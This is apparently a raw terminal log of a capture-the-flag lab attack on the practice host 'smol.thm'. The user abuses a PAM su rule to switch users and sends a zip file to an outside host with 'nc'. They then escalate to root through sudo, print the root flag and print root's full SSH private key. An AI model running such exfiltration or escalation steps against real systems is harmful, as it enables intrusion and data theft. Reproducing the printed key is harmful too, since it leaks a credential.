@@ -1,0 +1,226 @@
+Script started on 2025-01-27 20:35:41+03:00 [COMMAND="ssh -i think.id.rsa think@smol.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+The authenticity of host 'smol.thm (10.10.90.213)' can't be established.
+ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'smol.thm' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 27 Jan 2025 05:35:45 PM UTC
+
+  System load:  0.11              Processes:             159
+  Usage of /:   56.8% of 9.75GB   Users logged in:       0
+  Memory usage: 18%               IPv4 address for ens5: 10.10.90.213
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+162 updates can be applied immediately.
+125 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+]0;think@smol: ~[01;32mthink@smol[00m:[01;34m~[00m$ id
+uid=1000(think) gid=1000(think) groups=1000(think),1004(dev),1005(internal)
+]0;think@smol: ~[01;32mthink@smol[00m:[01;34m~[00m$ ls
+]0;think@smol: ~[01;32mthink@smol[00m:[01;34m~[00m$ ls -al
+total 32
+drwxr-x--- 5 think internal 4096 Jan 12  2024 [0m[01;34m.[0m
+drwxr-xr-x 6 root  root     4096 Aug 16  2023 [01;34m..[0m
+lrwxrwxrwx 1 root  root        9 Jun 21  2023 [01;36m.bash_history[0m -> [40;33;01m/dev/null[0m
+-rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout
+-rw-r--r-- 1 think think    3771 Jun  2  2023 .bashrc
+drwx------ 2 think think    4096 Jan 12  2024 [01;34m.cache[0m
+drwx------ 3 think think    4096 Aug 18  2023 [01;34m.gnupg[0m
+-rw-r--r-- 1 think think     807 Jun  2  2023 .profile
+drwxr-xr-x 2 think think    4096 Jun 21  2023 [01;34m.ssh[0m
+lrwxrwxrwx 1 root  root        9 Aug 18  2023 [01;36m.viminfo[0m -> [40;33;01m/dev/null[0m
+]0;think@smol: ~[01;32mthink@smol[00m:[01;34m~[00m$ sudo -l
+[sudo] password for think: 
+]0;think@smol: ~[01;32mthink@smol[00m:[01;34m~[00m$ cat /etc/pam.d/su
+#
+# The PAM configuration file for the Shadow `su' service
+#
+
+# This allows root to su without passwords (normal operation)
+auth       sufficient pam_rootok.so
+auth  [success=ignore default=1] pam_succeed_if.so user = gege
+auth  sufficient                 pam_succeed_if.so use_uid user = think
+# Uncomment this to force users to be a member of group root
+# before they can use `su'. You can also add "group=foo"
+# to the end of this line if you want to use a group other
+# than the default "root" (but this may have side effect of
+# denying "root" user, unless she's a member of "foo" or explicitly
+# permitted earlier by e.g. "sufficient pam_rootok.so").
+# (Replaces the `SU_WHEEL_ONLY' option from login.defs)
+# auth       required   pam_wheel.so
+
+# Uncomment this if you want wheel members to be able to
+# su without a password.
+# auth       sufficient pam_wheel.so trust
+
+# Uncomment this if you want members of a specific group to not
+# be allowed to use su at all.
+# auth       required   pam_wheel.so deny group=nosu
+
+# Uncomment and edit /etc/security/time.conf if you need to set
+# time restrainst on su usage.
+# (Replaces the `PORTTIME_CHECKS_ENAB' option from login.defs
+# as well as /etc/porttime)
+# account    requisite  pam_time.so
+
+# This module parses environment configuration file(s)
+# and also allows you to use an extended config
+# file /etc/security/pam_env.conf.
+# 
+# parsing /etc/environment needs "readenv=1"
+session       required   pam_env.so readenv=1
+# locale variables are also kept into /etc/default/locale in etch
+# reading this file *in addition to /etc/environment* does not hurt
+session       required   pam_env.so readenv=1 envfile=/etc/default/locale
+
+# Defines the MAIL environment variable
+# However, userdel also needs MAIL_DIR and MAIL_FILE variables
+# in /etc/login.defs to make sure that removing a user 
+# also removes the user's mail spool file.
+# See comments in /etc/login.defs
+#
+# "nopen" stands to avoid reporting new mail when su'ing to another user
+session    optional   pam_mail.so nopen
+
+# Sets up user limits according to /etc/security/limits.conf
+# (Replaces the use of /etc/limits in old login)
+session    required   pam_limits.so
+
+# The standard Unix authentication modules, used with
+# NIS (man nsswitch) as well as normal /etc/passwd and
+# /etc/shadow entries.
+@include common-auth
+@include common-account
+@include common-session
+
+
+]0;think@smol: ~[01;32mthink@smol[00m:[01;34m~[00m$ su - gege
+]0;gege@smol: ~[01;32mgege@smol[00m:[01;34m~[00m$ cd
+]0;gege@smol: ~[01;32mgege@smol[00m:[01;34m~[00m$ ls
+[0m[01;32mwordpress.old.zip[0m
+]0;gege@smol: ~[01;32mgege@smol[00m:[01;34m~[00m$ cat wordpress.old.zip | nc 10.9.2.155 9999
+]0;gege@smol: ~[01;32mgege@smol[00m:[01;34m~[00m$ cat wordpress.old.zip | nc 10.9.2.155 9999[1P 9999[1@1
+]0;gege@smol: ~[01;32mgege@smol[00m:[01;34m~[00m$ pv
+
+Command 'pv' not found, but can be installed with:
+
+apt install pv
+Please ask your administrator.
+
+]0;gege@smol: ~[01;32mgege@smol[00m:[01;34m~[00m$ which dd
+/usr/bin/dd
+]0;gege@smol: ~[01;32mgege@smol[00m:[01;34m~[00m$ dd if=wordpress.old.zip status=progress | nc 10.9.2.155 9999[1P 9999[1@1
+213504 bytes (214 kB, 208 KiB) copied, 1 s, 199 kB/s442880 bytes (443 kB, 432 KiB) copied, 2 s, 210 kB/s688640 bytes (689 kB, 672 KiB) copied, 3 s, 224 kB/s999936 bytes (1.0 MB, 976 KiB) copied, 4 s, 246 kB/s1344000 bytes (1.3 MB, 1.3 MiB) copied, 5 s, 267 kB/s1769984 bytes (1.8 MB, 1.7 MiB) copied, 6 s, 293 kB/s2327040 bytes (2.3 MB, 2.2 MiB) copied, 7 s, 331 kB/s3113472 bytes (3.1 MB, 3.0 MiB) copied, 8 s, 389 kB/s4063744 bytes (4.1 MB, 3.9 MiB) copied, 9 s, 442 kB/s4874752 bytes (4.9 MB, 4.6 MiB) copied, 10 s, 485 kB/s5759488 bytes (5.8 MB, 5.5 MiB) copied, 11 s, 522 kB/s6775808 bytes (6.8 MB, 6.5 MiB) copied, 12 s, 564 kB/s7513088 bytes (7.5 MB, 7.2 MiB) copied, 13 s, 560 kB/s8143872 bytes (8.1 MB, 7.8 MiB) copied, 14 s, 581 kB/s9176064 bytes (9.2 MB, 8.8 MiB) copied, 15 s, 611 kB/s9913856 bytes (9.9 MB, 9.5 MiB) copied, 16 s, 618 kB/s10870272 bytes (11 MB, 10 MiB) copied, 17 s, 639 kB/s 11689472 bytes (12 MB, 11 MiB) copied, 18 s, 649 kB/s12770816 bytes (13 MB, 12 MiB) copied, 19 s, 672 kB/s13458944 bytes (13 MB, 13 MiB) copied, 20 s, 673 kB/s14376448 bytes (14 MB, 14 MiB) copied, 21 s, 684 kB/s15556608 bytes (16 MB, 15 MiB) copied, 22 s, 706 kB/s16637952 bytes (17 MB, 16 MiB) copied, 23 s, 722 kB/s17735680 bytes (18 MB, 17 MiB) copied, 24 s, 739 kB/s18817024 bytes (19 MB, 18 MiB) copied, 25 s, 748 kB/s20143616 bytes (20 MB, 19 MiB) copied, 26 s, 774 kB/s20602368 bytes (21 MB, 20 MiB) copied, 27 s, 763 kB/s22092800 bytes (22 MB, 21 MiB) copied, 28 s, 779 kB/s23529472 bytes (24 MB, 22 MiB) copied, 29 s, 811 kB/s24463360 bytes (24 MB, 23 MiB) copied, 30 s, 815 kB/s25380352 bytes (25 MB, 24 MiB) copied, 31 s, 819 kB/s25511424 bytes (26 MB, 24 MiB) copied, 32 s, 792 kB/s26829312 bytes (27 MB, 26 MiB) copied, 33 s, 812 kB/s27910656 bytes (28 MB, 27 MiB) copied, 34 s, 820 kB/s28697088 bytes (29 MB, 27 MiB) copied, 35 s, 819 kB/s29647360 bytes (30 MB, 28 MiB) copied, 36 s, 823 kB/s30564864 bytes (31 MB, 29 MiB) copied, 37 s, 826 kB/s31531520 bytes (32 MB, 30 MiB) copied, 38 s, 822 kB/s32196096 bytes (32 MB, 31 MiB) copied, 39 s, 821 kB/s
+63020+1 records in
+63020+1 records out
+32266546 bytes (32 MB, 31 MiB) copied, 39.2808 s, 821 kB/s
+]0;gege@smol: ~[01;32mgege@smol[00m:[01;34m~[00m$ su xaci[K[Kvi
+Password: 
+]0;xavi@smol: /home/gege[01;32mxavi@smol[00m:[01;34m/home/gege[00m$ ls
+[0m[01;32mwordpress.old.zip[0m
+]0;xavi@smol: /home/gege[01;32mxavi@smol[00m:[01;34m/home/gege[00m$ id
+uid=1001(xavi) gid=1001(xavi) groups=1001(xavi),1005(internal)
+]0;xavi@smol: /home/gege[01;32mxavi@smol[00m:[01;34m/home/gege[00m$ sudo -l
+[sudo] password for xavi: 
+Matching Defaults entries for xavi on smol:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User xavi may run the following commands on smol:
+    (ALL : ALL) ALL
+]0;xavi@smol: /home/gege[01;32mxavi@smol[00m:[01;34m/home/gege[00m$ sudo su
+[31mroot@smol[0m:[34m/home/gege[0m$ cd
+[31mroot@smol[0m:[34m~[0m$ ls
+total 64K
+drwx------  7 root root 4.0K May  2  2024 [0m[01;34m.[0m
+drwxr-xr-x 18 root root 4.0K Mar 29  2024 [01;34m..[0m
+lrwxrwxrwx  1 root root    9 Jun  2  2023 [01;36m.bash_history[0m -> [40;33;01m/dev/null[0m
+-rw-r--r--  1 root root 3.2K Jun 21  2023 .bashrc
+drwx------  2 root root 4.0K Jun  2  2023 [01;34m.cache[0m
+-rw-------  1 root root   35 Mar 29  2024 .lesshst
+drwxr-xr-x  3 root root 4.0K Jun 21  2023 [01;34m.local[0m
+lrwxrwxrwx  1 root root    9 Aug 18  2023 [01;36m.mysql_history[0m -> [40;33;01m/dev/null[0m
+drwxr-xr-x  4 root root 4.0K Aug 16  2023 [01;34m.phpbrew[0m
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-r-----  1 root root   33 Aug 16  2023 root.txt
+-rw-r--r--  1 root root   75 Aug 17  2023 .selected_editor
+drwx------  3 root root 4.0K Jun 21  2023 [01;34msnap[0m
+drwx------  2 root root 4.0K Jun  2  2023 [01;34m.ssh[0m
+-rw-rw-rw-  1 root root  14K May  2  2024 .viminfo
+[31mroot@smol[0m:[34m~[0m$ cat root.txt
+bf89ea3ea01992353aef1f576214d4e4
+[31mroot@smol[0m:[34m~[0m$ ls[K[Kcd .ssh
+[31mroot@smol[0m:[34m~/.ssh[0m$ ls
+total 20K
+drwx------ 2 root root 4.0K Jun  2  2023 [0m[01;34m.[0m
+drwx------ 7 root root 4.0K May  2  2024 [01;34m..[0m
+-rw------- 1 root root 1.2K Mar 29  2024 authorized_keys
+-rw------- 1 root root 2.6K Jun  2  2023 id_rsa
+-rw-r--r-- 1 root root  571 Jun  2  2023 id_rsa.pub
+[31mroot@smol[0m:[34m~/.ssh[0m$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+[31mroot@smol[0m:[34m~/.ssh[0m$ exit
+exit
+]0;xavi@smol: /home/gege[01;32mxavi@smol[00m:[01;34m/home/gege[00m$ exit
+exit
+]0;gege@smol: ~[01;32mgege@smol[00m:[01;34m~[00m$ exit
+logout
+]0;think@smol: ~[01;32mthink@smol[00m:[01;34m~[00m$ exit
+logout
+Connection to smol.thm closed.
+
+Script done on 2025-01-27 20:56:49+03:00 [COMMAND_EXIT_CODE="0"]
